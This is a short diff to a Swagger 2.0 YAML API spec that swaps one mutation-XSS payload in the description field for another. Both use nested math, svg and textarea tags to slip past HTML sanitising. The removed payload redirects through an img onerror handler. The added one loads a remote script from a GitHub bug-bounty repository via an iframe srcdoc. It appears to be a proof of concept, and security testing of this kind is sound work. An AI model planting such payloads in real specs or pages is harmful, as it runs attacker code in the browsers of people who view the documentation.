@@ -1,8 +1,7 @@
 swagger: '2.0'
 info:
   title: Example yaml.spec
-  description: |
-    <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img src='#' onerror='location.href = "//example.com"'>">
+  description: <form><math><mtext></form><form><mglyph><svg><mtext><textarea><desc id="</textarea><math><mtext><!--"><textarea id="--><iframe srcdoc="<script><script src=https://raw.githubusercontent.com/bebiksior/bugbounty-assets/main/script.js></script>">
 paths:
   /accounts:
     get:
